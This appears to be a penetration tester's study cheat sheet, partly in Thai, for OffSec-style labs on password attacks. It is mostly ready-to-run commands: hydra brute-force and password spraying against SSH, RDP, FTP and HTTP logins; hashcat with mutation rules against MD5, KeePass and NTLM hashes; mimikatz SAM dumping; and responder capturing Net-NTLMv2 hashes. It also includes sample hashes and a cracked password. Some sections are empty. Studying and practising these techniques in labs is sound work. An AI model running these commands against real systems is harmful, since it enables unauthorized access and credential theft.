[[Network Bruteforce]]

```bash
sudo nmap -sV -p 2222 192.168.50.201
# bruteforce ssh 
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.142.201

ssh george@192.168.142.201 -p 2222 

# Password splay 
hydra -L ./user.txt -p 'SuperS3cure1337#' rdp://192.168.142.202 
# RDP Delay 10s 
hydra -L ./user.txt -p 'SuperS3cure1337#' rdp://192.168.142.202  -w 10 -t 1
# FTP Bruteforce password
hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.142.202 
```

[[HTTP POST Login Form]]
![[HTTPOSTBRUTE-1.png]]

![[HTTPOSTBRUTE-2.png]]

```
# Attack HTTP POST Form bruteforce password
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

# Password Spray 
hydra -L user.txt -p 'P@ssw0rd 192.168.50.201 http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"

```

[[HTTPBasicAuth]]

```
hydra -L users.txt -P pass.txt vuln-domain.com http-get /path/to/login
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.142.201 http-get /   

```

[[Mutating Wordlists]]
```
# MD5 crack with rule 
echo '056df33e47082c77148dba529212d50a' > hash1

# กำหนด rule ให้คำ 1@3$5 ต่อท้าย password กรณีขึ้นต้นใช้ ^ แต่ถ้าหากลงท้ายใช้ $
cat rulehashcat 
$1 $@ $3 $$ $5

hashcat -m 0 hash1 /usr/share/wordlists/rockyou.txt -r rulehashcat --force 
```

ref rule: https://hashcat.net/wiki/doku.php?id=rule_based_attack 

```
# กำหนด rule สำหรับรหัสที่เป็น uppercase และ duplicate 
echo '19adc0e8921336d08502c039dc297ff8' > hash2
cat rulehashcat 
u d

hashcat -m 0 hash2 /usr/share/wordlists/rockyou.txt -r rulehashcat --force 

```

[[Password Manager]]

Offsec มักชอบใช้ [[KeypassDatabase]] [[kdbx]]
```bash 
keepass2john Database.kdbx > keepass.hash

cat keepass.hash                 
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1

# Remove string "Database:"
cat keepass.hash 
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1

hashcat --help | grep -i "KeePass"

hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force 
```

[[SSH Private Key Passphrase]]

```


```

[[Cracking NTLM]]

```bash
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam

.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" 

cat nelly.hash
hashcat --help | grep -i "ntlm"
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

xfreerdp /u:nelly /p:nicole1 /v:192.168.142.210 /cert-ignore /dynamic-resolution +clipboard /drive:TEST,/home/kali/

```

[[passTheHash]]

```bash 
# กรณีไม่สามารถ Crack NTLM ได้เราสามารถใช้ PTH ได้ 


```

[[Cracking Net-NTLMv2]] 

```
# การโจมตีต้องมีการเปิด Listening บน interface ของเรา เพื่อรอรับการเชื่อมต่อ 
sudo responder -I tun0 

# บนเครื่องเป้าหมายทำการเรียกใช้งาน share มาที่ interface tun0
dir \\192.168.45.168 

# ให้สังเกตผลจากหน้า responder 

# นำไปใส่ ไฟล์ netntlm-hash
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E00480055005800430034005400490043000400340057...

kali@kali:~$ hashcat --help | grep -i "ntlm"
   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
   5600 | NetNTLMv2                                           | Network Protocol


# crack ด้วย hashcat 

```